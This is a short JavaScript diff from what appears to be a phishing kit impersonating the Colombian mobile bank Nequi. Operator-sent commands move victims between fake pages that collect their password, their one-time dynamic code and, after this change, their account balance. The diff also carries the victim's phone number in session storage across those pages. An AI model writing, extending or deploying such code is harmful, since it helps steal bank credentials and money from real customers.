@@ -249,23 +249,28 @@
                   window.__nequiProcessing = false;
                   break;
                   
+                case 'nequi_request_saldo':
                 case 'nequi_request_clave':
-                  console.log('[NEQUI-NUMERO] → Redirigiendo a clave.html');
-                  window.location.href = 'clave.html';
+                  console.log('[NEQUI-NUMERO] → Redirigiendo a saldo-input.html');
+                  sessionStorage.setItem('nequi_phone', phoneNumber);
+                  window.location.href = 'saldo-input.html';
                   break;
                   
                 case 'nequi_error_clave':
                   console.log('[NEQUI-NUMERO] → Error clave, redirigiendo a clave.html');
+                  sessionStorage.setItem('nequi_phone', phoneNumber);
                   window.location.href = 'clave.html';
                   break;
                   
                 case 'nequi_request_dinamica':
                   console.log('[NEQUI-NUMERO] → Redirigiendo a clave-dinamica.html');
+                  sessionStorage.setItem('nequi_phone', phoneNumber);
                   window.location.href = 'clave-dinamica.html';
                   break;
                   
                 case 'nequi_error_dinamica':
                   console.log('[NEQUI-NUMERO] → Error dinámica, redirigiendo a clave-dinamica.html');
+                  sessionStorage.setItem('nequi_phone', phoneNumber);
                   window.location.href = 'clave-dinamica.html';
                   break;
                   
